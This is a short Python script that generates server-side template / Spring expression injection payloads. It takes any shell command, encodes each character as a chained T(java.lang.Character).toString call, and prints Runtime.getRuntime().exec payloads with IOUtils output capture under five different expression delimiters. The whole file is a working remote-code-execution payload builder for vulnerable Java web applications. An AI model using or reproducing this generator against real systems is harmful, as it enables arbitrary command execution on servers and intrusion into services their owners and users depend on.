import argparse

command = ""

def initialize_variables():
    global command
    parser = argparse.ArgumentParser()
    parser.add_argument('-c', '--command', help='Command to execute', dest='command')

    args = parser.parse_args()

    command = args.command

def string_to_decimal(string):
	value = ""
	for char in string:
		value += str(ord(char)) + " "
	return value[:-1].split(" ")

def create_payload():
	char_values = string_to_decimal(command)
	first_elem = char_values[0]
	rest = char_values[1:]

	payload = "T(java.lang.Character).toString(" + str(first_elem) + ")."

	for char in rest:
		payload += "concat(T(java.lang.Character).toString(" + str(char) + "))."
	
	payload = payload[:-1] # Delete last '.'

	return payload

if __name__ == "__main__":
	initialize_variables()
	payl = create_payload()

	symbol_list = ["$", "*", "@", "#", "~"]

	for symbol in symbol_list:
		print(symbol + "{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(" + payl + ").getInputStream())}\n")
